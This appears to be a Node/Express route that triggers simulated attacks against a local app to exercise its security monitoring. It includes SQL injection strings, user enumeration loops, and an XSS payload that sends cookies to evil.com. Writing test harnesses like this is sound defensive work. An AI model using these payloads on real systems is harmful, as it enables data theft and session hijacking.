const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const { JWT_SECRET } = require('../config/constants');

// Helper to construct simulated HTTP requests through Express internal router stack or fetch
const SIM_USER_TOKEN = jwt.sign(
  { userId: 'user_1', username: 'alice', role: 'USER' },
  JWT_SECRET,
  { expiresIn: '1h' }
);

router.post('/trigger', async (req, res) => {
  const { scenario } = req.body;
  const baseUrl = `http://localhost:${process.env.PORT || 5000}`;

  try {
    let result = null;

    switch (scenario) {
      case 'NORMAL_REQUEST':
        result = await executeSimulatedFetch(`${baseUrl}/api/products`, { method: 'GET' });
        break;

      case 'MISSING_JWT':
        result = await executeSimulatedFetch(`${baseUrl}/api/profile`, { method: 'GET' });
        break;

      case 'INVALID_JWT':
        result = await executeSimulatedFetch(`${baseUrl}/api/profile`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer invalid.tampered.jwt.signature' }
        });
        break;

      case 'BOLA_ATTACK':
        result = await executeSimulatedFetch(`${baseUrl}/api/users/user_2`, {
          method: 'GET',
          headers: { 'Authorization': `Bearer ${SIM_USER_TOKEN}` }
        });
        break;

      case 'SQLI_ATTACK':
        result = await executeSimulatedFetch(`${baseUrl}/api/search?q=laptop' OR 1=1 --`, { method: 'GET' });
        break;

      case 'XSS_ATTACK':
        result = await executeSimulatedFetch(`${baseUrl}/api/orders`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${SIM_USER_TOKEN}`
          },
          body: JSON.stringify({ product: "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>" })
        });
        break;

      case 'RATE_ABUSE':
        const promises = [];
        for (let i = 0; i < 35; i++) {
          promises.push(executeSimulatedFetch(`${baseUrl}/api/products`, { method: 'GET' }));
        }
        const burstResults = await Promise.all(promises);
        result = burstResults[burstResults.length - 1]; // Return last escalated response
        break;

      case 'ENUMERATION':
        const enumResults = [];
        for (let i = 1; i <= 7; i++) {
          enumResults.push(await executeSimulatedFetch(`${baseUrl}/api/users/probe_${i}`, {
            method: 'GET',
            headers: { 'Authorization': `Bearer ${SIM_USER_TOKEN}` }
          }));
        }
        result = enumResults[enumResults.length - 1];
        break;

      case 'CORRELATED_ATTACK':
        // Phase 1: SQLi
        await executeSimulatedFetch(`${baseUrl}/api/search?q=' UNION SELECT * FROM users --`, { method: 'GET' });
        // Phase 2: Rapid Enumeration
        for (let i = 10; i <= 15; i++) {
          await executeSimulatedFetch(`${baseUrl}/api/users/victim_${i}`, {
            method: 'GET',
            headers: { 'Authorization': `Bearer ${SIM_USER_TOKEN}` }
          });
        }
        // Phase 3: XSS payload
        result = await executeSimulatedFetch(`${baseUrl}/api/orders`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${SIM_USER_TOKEN}` },
          body: JSON.stringify({ product: "<img src=x onerror=alert('Correlated_Attack')>" })
        });
        break;

      default:
        return res.status(400).json({ success: false, message: `Unknown scenario: ${scenario}` });
    }

    return res.json({
      success: true,
      scenario,
      simulationResult: result
    });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

async function executeSimulatedFetch(url, options = {}) {
  try {
    const response = await fetch(url, options);
    const json = await response.json();
    const headers = {};
    response.headers.forEach((val, key) => { headers[key] = val; });

    return {
      status: response.status,
      headers,
      body: json
    };
  } catch (err) {
    return { status: 500, error: err.message };
  }
}

module.exports = router;
